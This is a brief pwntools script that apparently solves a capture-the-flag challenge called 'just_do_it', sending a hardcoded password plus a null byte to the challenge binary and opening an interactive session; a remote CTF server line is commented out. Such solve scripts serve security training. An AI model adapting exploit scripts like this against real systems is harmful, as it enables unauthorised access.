#Import pwntools
from pwn import *

#Create the remote connection to the challenge
target = process('just_do_it')
#target = remote('pwn1.chal.ctf.westerns.tokyo', 12482)

#Create the payload
payload = b"P@SSW0RD" + b"\x00"

#Send the payload
target.sendline(payload)

#Drop to an interactive shell, so we can read everything the server prints out
target.interactive()

